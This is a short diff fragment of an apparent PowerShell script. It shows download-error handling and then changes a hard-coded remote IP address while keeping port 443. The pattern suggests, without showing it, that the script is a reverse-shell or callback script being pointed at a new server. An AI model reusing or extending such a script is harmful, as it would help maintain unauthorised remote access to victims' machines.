@@ -11,7 +11,7 @@ try {
 } catch {
     Write-Host "Download Error: $($_.Exception.Message)" -ForegroundColor Yellow
 }
-$ip = "91.245.60.45"
+$ip = "89.108.79.197"
 $port = 443
 
 try {
